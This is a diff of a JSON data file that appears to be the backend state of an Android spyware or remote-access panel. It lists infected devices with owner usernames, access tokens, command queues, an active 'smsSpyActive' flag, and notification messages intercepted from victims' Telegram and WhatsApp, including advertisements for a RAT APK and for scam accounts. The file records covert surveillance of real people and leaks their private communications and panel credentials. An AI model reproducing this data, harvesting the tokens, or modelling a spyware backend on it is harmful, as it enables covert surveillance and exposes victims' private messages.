@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778593344,
+    "lastSeen": 1776778594605,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778595412
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778595355
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778595327
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778595238
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16868 pesan baru dari 118 obrolan",
+        "time": "21/04 20:36",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778595222
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14362,46 +14402,6 @@
         "time": "21/04 20:26",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777976480
-      },
-      {
-        "appName": "Telegram",
-        "sender": "LearnTermuxHUB.Tools: 𝐃𝐈𝐓𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆",
-        "content": "APK BUG X RAT 5K PV @Napkxiua PERMANEN FULL UP",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777976463
-      },
-      {
-        "appName": "Telegram",
-        "sender": "LearnTermuxHUB.Tools: 𝐃𝐈𝐓𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆",
-        "content": "APK BUG X RAT 5K PV @Napkxiua PERMANEN FULL UP",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777975676
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "Fs Noktel \nId 1 r9k nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777975584
-      },
-      {
-        "appName": "Telegram",
-        "sender": "./j4X¡tsme な #sa #flory 🎖️",
-        "content": "Fs Noktel \nId 1 r9k nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777975529
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5944 pesan baru dari 49 obrolan",
-        "time": "21/04 20:26",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777975512
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778592838,
+    "lastSeen": 1776778593394,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
